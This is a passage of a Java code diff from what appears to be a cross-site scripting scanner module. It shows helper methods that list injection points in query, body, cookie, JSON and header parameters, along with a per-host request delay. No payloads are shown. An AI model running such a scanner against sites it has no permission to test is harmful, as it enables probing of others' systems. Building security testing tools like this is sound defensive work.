+            }
+            targets.add(new XssTarget(headerName, headerValue, XssTargetType.HEADER));
+        }
+
+        return targets;
+    }
+
+    /**
+     * Recursively extract all string-valued JSON parameters using dot-notation keys.
+     */
+    private void extractJsonXssTargets(com.google.gson.JsonObject obj, String prefix, List<XssTarget> targets) {
+        for (String key : obj.keySet()) {
+            com.google.gson.JsonElement val = obj.get(key);
+            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
+            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
+                targets.add(new XssTarget(fullKey, val.getAsString(), XssTargetType.JSON));
+            } else if (val.isJsonObject()) {
+                extractJsonXssTargets(val.getAsJsonObject(), fullKey, targets);
+            }
+        }
+    }
+
+    private String extractPath(String url) {
+        try {
+            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
+            int s = url.indexOf('/');
+            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
+        } catch (Exception ignored) {}
+        return url;
+    }
+
+    private void perHostDelay() throws InterruptedException {
+        int delay = config.getInt("xss.perHostDelay", 300);
+        if (delay > 0) Thread.sleep(delay);
+    }
+
+    @Override
+    public void destroy() { }
+
+    private enum XssTargetType { QUERY, BODY, COOKIE, JSON, HEADER }
+
+    private static class XssTarget {
+        final String name, originalValue;
+        final XssTargetType type;
+        XssTarget(String n, String v, XssTargetType t) { name = n; originalValue = v != null ? v : ""; type = t; }
+    }
+
+    private static String truncate(String s, int max) {
+        if (s == null) return "";
+        return s.length() > max ? s.substring(0, max) + "..." : s;
+    }
+
+}
